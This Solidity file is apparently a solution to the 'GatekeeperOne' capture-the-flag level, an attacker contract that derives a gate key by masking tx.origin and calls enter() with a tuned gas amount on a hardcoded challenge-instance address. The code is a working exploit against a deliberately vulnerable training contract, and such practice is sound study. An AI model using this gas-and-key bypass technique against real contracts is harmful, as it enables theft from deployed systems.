// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    address public challengeInstance;

    constructor() {
        challengeInstance = 0xEe2707AbCCcC037A1F9bbB0FE19270a38dc5B582;
    }

    // function attack() external {
    //     bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    //     for (uint256 i = 1; i < 2; i++) {
    //         (bool result,) = challengeInstance.call{gas: 256 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
    //         if (result) {
    //             console.log("gas", i);
    //             break;
    //         }
    //     }
    // }
    function openGate() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        IGatekeeperOne(0xEe2707AbCCcC037A1F9bbB0FE19270a38dc5B582).enter{gas: 24829}(key);
    }
}
